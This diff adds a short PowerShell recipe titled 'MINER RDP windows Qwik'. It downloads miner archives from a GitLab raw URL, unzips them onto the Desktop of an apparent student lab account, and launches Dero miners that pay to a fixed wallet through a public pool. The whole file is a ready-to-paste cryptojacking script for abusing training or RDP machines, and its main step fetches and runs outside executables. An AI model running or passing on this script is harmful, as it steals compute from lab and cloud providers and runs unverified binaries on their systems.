@@ -1,0 +1,40 @@
+MINER RDP windows Qwik
+---------------------------------------------------------------------
+
+$url = 'https://gitlab.com/teletyl/jupyter/-/raw/main/astrominer.zip'
+$Dest = 'C:\Users\student_02_9679dc17c\Desktop\astrominer.zip'
+$web = New-Object -TypeName System.Net.WebClient
+$web.DownloadFile($url,$Dest)
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+function Unzip
+{
+    param([string]$zipfile, [string]$outpath)
+
+    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
+}
+
+Unzip "C:\Users\student_02_9679dc17c\Desktop\astrominer.zip" "C:\Users\student_02_9679dc17c\Desktop\"
+
+./astrominer.exe -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xm369mdkp06lgvqf4y5cm  -r pool.whalesburg.com:4305
+
+--------------dero-stratum-miner FIX---------------
+
+$url = 'https://gitlab.com/teletyl/jupyter/-/raw/main/dero-stratum-miner.zip'
+$Dest = 'C:\Users\student_02_9679dc17c\Desktop\dero-stratum-miner.zip'
+$web = New-Object -TypeName System.Net.WebClient
+$web.DownloadFile($url,$Dest)
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+function Unzip
+{
+    param([string]$zipfile, [string]$outpath)
+
+    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
+}
+
+Unzip "C:\Users\student_02_9679dc17c\Desktop\dero-stratum-miner.zip" "C:\Users\student_02_9679dc17c\Desktop\"
+
+./astrominer.exe -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xm369mdkp06lgvqf4y5cm  -r pool.whalesburg.com:4305
+
+./dero-stratum-miner.exe -r pool.whalesburg.com:4305 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xm369mdkp06lgvqf4y5cm
+
+------------------------------
